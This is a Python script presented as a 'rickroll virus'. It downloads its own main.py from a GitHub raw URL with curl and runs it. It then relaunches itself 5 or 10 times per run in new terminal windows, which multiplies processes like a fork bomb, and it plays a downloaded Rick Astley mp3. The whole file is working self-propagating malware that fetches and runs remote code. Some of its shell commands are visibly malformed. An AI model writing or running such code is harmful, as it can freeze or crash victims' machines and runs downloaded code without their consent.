import os
from os.path import exists
import time
from playsound import playsound
import platform
import subprocess
def Linux():
    if not exists(os.getcwd() + "/main.py"):
        subprocess.run(f"gnome-terminal -- bash -c ' cd {os.getcwd()}'",shell = True)
        subprocess.run(f"gnome-terminal -- bash -c ' curl -o main.py https://raw.githubusercontent.com/rauldhs/rickroll_virus/main/main.py'",shell = True)

        time.sleep(0.5)

        subprocess.run(f"gnome-terminal -- bash -c' python idk.py'",shell = True)
    else:
        for i in range(0,5):
            subprocess.run(f"gnome-terminal -- bash -c ' cd {os.getcwd()}'",shell = True)
            subprocess.run(f"gnome-terminal -- bash -c' python main.py'",shell = True)

        if exists(os.getcwd() + "/Never_gonna_give_you_up.mp3"):
            playsound("Never_gonna_give_you_up.mp3")
        else:
            subprocess.run(f"gnome-terminal -- bash -c ' cd {os.getcwd()}'",shell = True)
            subprocess.run(f"gnome-terminal -- bash -c ' curl -o Never_gonna_give_you_up.mp3 https://github.com/rauldhs/rickroll_virus/blob/main/Never%20gonna%20give%20you%20up.mp3?raw=true'",shell=True)
        
            playsound("Never_gonna_give_you_up.mp3")

def Windows():
    if not exists(os.getcwd() + "/main.py"):
        os.system("start  /min cmd /c cd " + os.getcwd())
        os.system("start  /min cmd /c curl -o main.py https://raw.githubusercontent.com/rauldhs/rickroll_virus/main/main.py")

        time.sleep(0.5)

        os.system("start /min  cmd /c python idk.py")
    else:
        for i in range(0,10):
            os.system("start  /min cmd /c cd " + os.getcwd())
            os.system("start /min  cmd /c python main.py")

        if exists(os.getcwd() + "/Never gonna give you up.mp3"):
            playsound("Never gonna give you up.mp3")
        else:
            os.system("start  /min cmd /c cd " + os.getcwd())
            os.system("start  /min cmd /c curl -o Never gonna give you up.mp3 https://github.com/rauldhs/rickroll_virus/blob/main/Never%20gonna%20give%20you%20up.mp3?raw=true")
        
            playsound("Never gonna give you up.mp3")



if platform.system() == 'Windows':
       Windows()
elif platform.system() == 'Linux':
       Linux()


